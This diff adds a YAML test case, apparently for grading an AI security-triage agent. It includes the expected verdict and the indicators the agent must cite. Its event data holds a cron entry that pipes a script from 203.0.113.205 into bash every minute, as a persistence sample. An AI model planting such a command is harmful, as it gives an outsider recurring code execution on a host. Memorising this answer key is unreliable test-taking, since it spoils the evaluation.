@@ -1,0 +1,20 @@
+id: case-cron-persist-001
+name: Cron persistence via curl pipeline write
+expected_verdict: true_positive
+mitre_attack: [T1053.003]
+notes: >
+  A cron entry fetching and piping a remote script every minute. Correct
+  agent rules true positive and cites the implant host.
+event:
+  event_type: endpoint_anomaly
+  host_ip: 10.22.6.31
+  user: deploy
+  payload:
+    process_tree: [crond, bash]
+    written_path: /etc/cron.d/health-sync
+    entry: "* * * * * curl http://203.0.113.205/p.sh | bash"
+evidence:
+  - ioc: 203.0.113.205
+    kind: ip
+    description: script host
+    must_surface: true
